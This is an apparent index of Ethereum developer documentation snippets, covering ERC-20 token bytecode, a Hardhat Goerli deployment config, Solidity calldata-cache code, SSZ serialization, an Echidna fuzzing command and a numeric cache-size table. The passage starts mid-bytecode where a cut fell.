MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Deployment\nDESCRIPTION: A Hardhat configuration file that sets up the development environment for deploying to the Goerli testnet. It loads environment variables for the Alchemy API URL and private key.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire('dotenv').config();\n\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\n\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nmodule.exports = {\n   solidity: \"0.7.3\",\n   defaultNetwork: \"goerli\",\n   networks: {\n      hardhat: {},\n      goerli: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: Função para codificar valores usando o cache\nDESCRIPTION: Função de visualização que converte um valor numérico em sua representação otimizada para uso em calldata, utilizando o cache quando possível para reduzir o tamanho dos dados transmitidos.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Get a value, return bytes that will encode it (using the cache if possible)\n    function encodeVal(uint _val) public view returns(bytes memory) {\n        uint _key = val2key[_val];\n\n        // The value isn't in the cache yet, add it\n        if (_key == 0)\n            return bytes.concat(INTO_CACHE, bytes32(_val));\n\n        // If the key is <0x10, return it as a single byte\n        if (_key < 0x10)\n            return bytes.concat(bytes1(uint8(_key)));\n\n        // Two byte value, encoded as 0x1vvv\n        if (_key < 0x1000)\n            return bytes.concat(bytes2(uint16(_key) | 0x1000));\n\n        // There is probably a clever way to do the following lines as a loop,\n        // but it's a view function so I'm optimizing for programmer time and\n        // simplicity.\n\n        if (_key < 16*256**2)\n            return bytes.concat(bytes3(uint24(_key) | (0x2 * 16 * 256**2)));\n        if (_key < 16*256**3)\n            return bytes.concat(bytes4(uint32(_key) | (0x3 * 16 * 256**3)));\n```\n\n----------------------------------------\n\nTITLE: Getting Share Balance in ERC-4626 Vault\nDESCRIPTION: This method returns the total number of shares owned by a specific account in the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction balanceOf(address owner) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: CREATE Operation (F0) in Ethereum EVM\nDESCRIPTION: Creates a new contract account with code from memory. The address is derived from the creating contract's address and nonce. Takes value, offset, and length parameters and returns the new contract address.\n\nLANGUAGE: solidity\nCODE:\n```\naddr = keccak256(rlp([address(this), this.nonce]))\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Gas Estimation Config\nDESCRIPTION: This command runs Echidna against the gas.sol contract with a configuration file that enables gas consumption estimation.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test gas.sol --config config.yaml\n```\n\n----------------------------------------\n\nTITLE: SSZ Serialized Output with Element Breakdown\nDESCRIPTION: A detailed breakdown of an SSZ serialized object showing each component's purpose. It demonstrates how fixed-length integers are encoded in little-endian format while variable-length data is placed at the end with an offset pointer in its original position.\n\nLANGUAGE: plaintext\nCODE:\n```\n[\n  37, 0, 0, 0,  # little-endian encoding of `number1`.\n  55, 0, 0, 0,  # little-endian encoding of `number2`.\n  16, 0, 0, 0,  # The \"offset\" that indicates where the value of `vector` starts (little-endian 16).\n  22, 0, 0, 0,  # little-endian encoding of `number3`.\n  1, 2, 3, 4,   # The actual values in `vector`.\n]\n```\n\n----------------------------------------\n\nTITLE: Defining Large Numerical Arrays for Cache Management in Ethereum\nDESCRIPTION: This code defines two numerical arrays: an unnamed array containing sequential memory addresses (starting from 14411627392) and a 'cache_sizes' array with memory size values in bytes. These arrays are likely used for memory management or cache optimization in the Ethereum project.\n\nLANGUAGE: unknown\nCODE:\n```\n14411627392, 14420013952, 14428402304, 14436793472, 14445181568,\n14453569664, 14461959808, 14470347904, 14478737024, 14487122816,\n14495511424, 14503901824, 14512291712, 14520677504, 14529064832,\n14537456768, 14545845632, 14554234496, 14562618496, 14571011456,\n14579398784, 14587789184, 14596172672, 14604564608, 14612953984,\n14621341312, 14629724288, 14638120832, 14646503296, 14654897536,\n14663284864, 14671675264, 14680061056, 14688447616, 14696835968,\n14705228416, 14713616768, 14722003328, 14730392192, 14738784128,\n14747172736, 14755561088, 14763947648, 14772336512, 14780725376,\n14789110144, 14797499776, 14805892736, 14814276992, 14822670208,\n14831056256, 14839444352, 14847836032, 14856222848, 14864612992,\n14872997504, 14881388672, 14889775744, 14898165376, 14906553472,\n14914944896, 14923329664, 14931721856, 14940109696, 14948497024,\n14956887424, 14965276544, 14973663616, 14982053248, 14990439808,\n14998830976, 15007216768, 15015605888, 15023995264, 15032385152,\n15040768384, 15049154944, 15057549184, 15065939072, 15074328448,\n15082715008, 15091104128, 15099493504, 15107879296, 15116269184,\n15124659584, 15133042304, 15141431936, 15149824384, 15158214272,\n15166602368, 15174991232, 15183378304, 15191760512, 15200154496,\n15208542592, 15216931712, 15225323392, 15233708416, 15242098048,\n15250489216, 15258875264, 15267265408, 15275654528, 15284043136,\n15292431488, 15300819584, 15309208192, 15317596544, 15325986176,\n15334374784, 15342763648, 15351151744, 15359540608, 15367929728,\n15376318336, 15384706432, 15393092992, 15401481856, 15409869952,\n15418258816, 15426649984, 15435037568, 15443425664, 15451815296,\n15460203392, 15468589184, 15476979328, 15485369216, 15493755776,\n15502146944, 15510534272, 15518924416, 15527311232, 15535699072,\n15544089472, 15552478336, 15560866688, 15569254528, 15577642624,\n15586031488, 15594419072, 15602809472, 15611199104, 15619586432,\n15627975296, 15636364928, 15644753792, 15653141888, 15661529216,\n15669918848, 15678305152, 15686696576, 15695083136, 15703474048,\n15711861632, 15720251264, 15728636288, 15737027456, 15745417088,\n15753804928, 15762194048, 15770582656, 15778971008, 15787358336,\n15795747712, 15804132224, 15812523392, 15820909696, 15829300096,\n15837691264, 15846071936, 15854466944, 15862855808, 15871244672,\n15879634816, 15888020608, 15896409728, 15904799104, 15913185152,\n15921577088, 15929966464, 15938354816, 15946743424, 15955129472,\n15963519872, 15971907968, 15980296064, 15988684928, 15997073024,\n16005460864, 16013851264, 16022241152, 16030629248, 16039012736,\n16047406976, 16055794816, 16064181376, 16072571264, 16080957824,\n16089346688, 16097737856, 16106125184, 16114514816, 16122904192,\n16131292544, 16139678848, 16148066944, 16156453504, 16164839552,\n16173236096, 16181623424, 16190012032, 16198401152, 16206790528,\n16215177344, 16223567744, 16231956352, 16240344704, 16248731008,\n16257117824, 16265504384, 16273898624, 16282281856, 16290668672,\n16299064192, 16307449216, 16315842176, 16324230016, 16332613504,\n16341006464, 16349394304, 16357783168, 16366172288, 16374561664,\n16382951296, 16391337856, 16399726208, 16408116352, 16416505472,\n16424892032, 16433282176, 16441668224, 16450058624, 16458448768,\n16466836864, 16475224448, 16483613056, 16492001408, 16500391808,\n16508779648, 16517166976, 16525555328, 16533944192, 16542330752,\n16550719616, 16559110528, 16567497088, 16575888512, 16584274816,\n16592665472, 16601051008, 16609442944, 16617832064, 16626218624,\n16634607488, 16642996096, 16651385728, 16659773824, 16668163712,\n16676552576, 16684938112, 16693328768, 16701718144, 16710095488,\n16718492288, 16726883968, 16735272832, 16743661184, 16752049792,\n16760436608, 16768827008, 16777214336, 16785599104, 16793992832,\n16802381696, 16810768768, 16819151744, 16827542656, 16835934848,\n16844323712, 16852711552, 16861101952, 16869489536, 16877876864,\n16886265728, 16894653056, 16903044736, 16911431296, 16919821696,\n16928207488, 16936592768, 16944987776, 16953375616, 16961763968,\n16970152832, 16978540928, 16986929536, 16995319168, 17003704448,\n17012096896, 17020481152, 17028870784, 17037262208, 17045649536,\n17054039936, 17062426496, 17070814336, 17079205504, 17087592064,\n17095978112, 17104369024, 17112759424, 17121147776, 17129536384,\n17137926016, 17146314368, 17154700928, 17163089792, 17171480192,\n17179864192, 17188256896, 17196644992, 17205033856, 17213423488,\n17221811072, 17230198912, 17238588032, 17246976896, 17255360384,\n17263754624, 17272143232, 17280530048, 17288918912, 17297309312,\n17305696384, 17314085504, 17322475136, 17330863744, 17339252096,\n17347640192, 17356026496, 17364413824, 17372796544, 17381190016,\n17389583488, 17397972608, 17406360704, 17414748544, 17423135872,\n17431527296, 17439915904, 17448303232, 17456691584, 17465081728,\n17473468288, 17481857408, 17490247552, 17498635904, 17507022464,\n17515409024, 17523801728, 17532189824, 17540577664, 17548966016,\n17557353344, 17565741184, 17574131584, 17582519168, 17590907008,\n17599296128, 17607687808, 17616076672, 17624455808, 17632852352,\n17641238656, 17649630848, 17658018944, 17666403968, 17674794112,\n17683178368, 17691573376, 17699962496, 17708350592, 17716739968,\n17725126528, 17733517184, 17741898112, 17750293888, 17758673024,\n17767070336, 17775458432, 17783848832, 17792236928, 17800625536,\n17809012352, 17817402752, 17825785984, 17834178944, 17842563968,\n17850955648, 17859344512, 17867732864, 17876119424, 17884511872,\n17892900224, 17901287296, 17909677696, 17918058112, 17926451072,\n17934843776, 17943230848, 17951609216, 17960008576, 17968397696,\n17976784256, 17985175424, 17993564032, 18001952128, 18010339712,\n18018728576, 18027116672, 18035503232, 18043894144, 18052283264,\n18060672128, 18069056384, 18077449856, 18085837184, 18094225792,\n18102613376, 18111004544, 18119388544, 18127781248, 18136170368,\n18144558976, 18152947328, 18161336192, 18169724288, 18178108544,\n18186498944, 18194886784, 18203275648, 18211666048, 18220048768,\n18228444544, 18236833408, 18245220736]\n```\n\n----------------------------------------\n\nTITLE: Preparing Function Call with Cache Parameters\nDESCRIPTION: Prepares a low-level function call that includes the function selector and cache inputs for testing parameter handling.\n\nLANGUAGE: solidity\nCODE:\n```\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n```\n\n----------------------------------------\n\nTITLE: ERC20DepositInitiated Event Parameters for Transfer Details\nDESCRIPTION: Defines the remaining parameters for the ERC20DepositInitiated event, including sender, recipient, amount, and additional data payload that can be included with the transfer.\n\nLANGUAGE: solidity\nCODE:\n```\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: SafeMath Addition Implementation in EVM Bytecode\nDESCRIPTION: This bytecode implements the SafeMath addition operation used for token balance updates. It checks for overflow conditions and throws an error with a descriptive message if the addition would result in an overflow.\n\nLANGUAGE: evm\nCODE:\n```\nJUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xFAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP\n```\n\n----------------------------------------\n\nTITLE: Token Transfer and Approval Functions in EVM Bytecode\nDESCRIPTION: EVM bytecode showing implementations of token transfer, approval, and balance checking functions. This includes the bytecode for checking allowances, transferring tokens between addresses, and managing approvals for third-party transfers.\n\nLANGUAGE: evm\nCODE:\n```\nDD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 